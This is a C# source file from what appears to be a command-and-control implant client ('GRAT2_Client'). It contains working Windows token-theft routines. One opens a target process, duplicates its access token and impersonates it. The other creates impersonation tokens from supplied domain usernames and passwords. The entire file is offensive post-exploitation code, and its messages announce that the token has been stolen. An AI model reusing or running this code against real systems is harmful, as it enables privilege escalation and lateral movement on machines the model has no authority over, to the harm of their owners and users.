using GRAT2_Client.PInvoke;
using System;
using System.Runtime.InteropServices;


namespace GRAT2_Client.Tokens_UAC
{
    class ProcessImpersonation
    {
        // https://posts.specterops.io/understanding-and-defending-against-access-token-theft-finding-alternatives-to-winlogon-exe-80696c8a73b
        // http://www.pinvoke.net/default.aspx/advapi32.openprocesstoken
        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const UInt32 TOKEN_DUPLICATE = 0x0002;
        public const UInt32 TOKEN_IMPERSONATE = 0x0004;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID);

        public static string RevertToSelf()
        {
            Interop.RevertToSelf();
            return "Token Reverted to initial state!";
        }

        public static string ProcImpersonation(string[] arguments)
        {
            try
            {
             int targetId = Int32.Parse(arguments[1]);

            IntPtr TokenHandle = IntPtr.Zero;
            IntPtr hDuplicateToken = IntPtr.Zero;

            var securityAttr = new flags.SECURITY_ATTRIBUTES();
            securityAttr.nLength = Marshal.SizeOf(securityAttr);


                IntPtr procHandle = Interop.OpenProcess((uint)flags.ProcessAccessRights.All, false, (uint)targetId);

                if (Interop.OpenProcessToken(procHandle, TOKEN_ALL_ACCESS, out TokenHandle))
                {
                    Interop.CloseHandle(procHandle);
                }
                else
                {
                    Console.WriteLine("Failed to pass process handle");
                }


                if (!Interop.DuplicateTokenEx(TokenHandle, (UInt32)flags.ACCESS_MASK.MAXIMUM_ALLOWED, ref securityAttr, flags.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, flags.TOKEN_TYPE.TokenImpersonation, out hDuplicateToken))
                {
                    return "Failed to Duplicate Token - Make sure you have administrator privileges";
                }
                Interop.CloseHandle(TokenHandle);

                if (!Interop.ImpersonateLoggedOnUser(hDuplicateToken))
                {
                    Interop.CloseHandle(TokenHandle);
                    Interop.CloseHandle(hDuplicateToken);
                    return "Failed to Impersonate Token";
                }
                Interop.CloseHandle(TokenHandle);
            }
            catch(Exception ex)
            {
                return ex.Message;
            }

            return "You have successfully steal token from process";
        }

        public static string UserImpersonation(string[] arguments)
        {
            try
            {
                Interop.RevertToSelf();
                string splitArguments = arguments[1].Replace('\\', ' ');
                string[] domainUser = splitArguments.Split(' ');
 
                string domain = domainUser[0];
                string user = domainUser[1];
                string pass = arguments[2];
                IntPtr procToken = IntPtr.Zero;


                if (!Interop.LogonUserA(user, domain, pass, flags.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS, flags.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, out procToken))
                {
                    return "Failed to Impersonate Token";
                }
                if (!Interop.ImpersonateLoggedOnUser(procToken))
                {
                    Interop.CloseHandle(procToken);
                    return "Failed to Impersonate Token";
                }
            }
            catch(Exception ex)
            {
                return ex.Message;
            }

            return "Token for the specific user has been created!";
        }

    }
}
